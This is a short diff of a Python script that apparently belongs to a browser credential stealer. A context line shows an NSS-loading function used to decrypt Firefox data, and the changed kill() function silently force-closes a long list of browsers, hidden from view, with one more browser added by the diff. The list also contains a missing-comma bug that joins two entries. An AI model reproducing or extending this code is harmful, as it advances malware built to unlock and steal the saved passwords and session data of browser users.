@@ -59,7 +59,7 @@ def load_nss(profile_path, nss3):
             return nss
 
 def kill():
-    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
+    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
 
     for exe in exes:
         subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
